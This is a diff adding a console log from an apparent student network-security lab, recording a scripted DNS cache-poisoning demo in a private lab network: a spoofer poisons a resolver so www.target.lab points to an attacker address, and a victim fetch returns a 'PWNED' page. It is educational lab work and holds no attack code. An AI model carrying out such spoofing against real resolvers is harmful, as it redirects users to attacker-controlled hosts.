@@ -1,0 +1,26 @@
+[1/5] Reset lab
+[*] Restarting unbound on resolver
+[*] Killing spoofer.py + tshark on attacker/resolver
+[*] Lab reset OK
+[2/5] Start tshark on resolver (background)
+[3/5] Run spoofer on attacker (foreground, up to 60s)
+[*] target=www.target.lab via resolver=192.168.56.20
+[*] spoofing src=192.168.56.99 dport=33333 → A 192.168.56.10
+[+] poisoned in 4.2 seconds (target=www.target.lab → 192.168.56.10)
+[4/5] Run demo.sh on victim
+=== Phase 1 — Post-attack dig ===
+192.168.56.10
+
+=== Phase 2 — HTTP fetch ===
+(curl --resolve www.target.lab:80:192.168.56.10)
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>PWNED</title>
+  <style>
+    body {
+      font-family: monospace;
+[+] PASS — www.target.lab resolves to 192.168.56.10 (poisoned)
+[5/5] Stop tshark and copy pcap
+[+] Part 1 demo SUCCESS  (pcap → /c/Users/Adam/Documents/Network Security DNS Project/lab/scripts/../../docs/captures/poison.pcap)
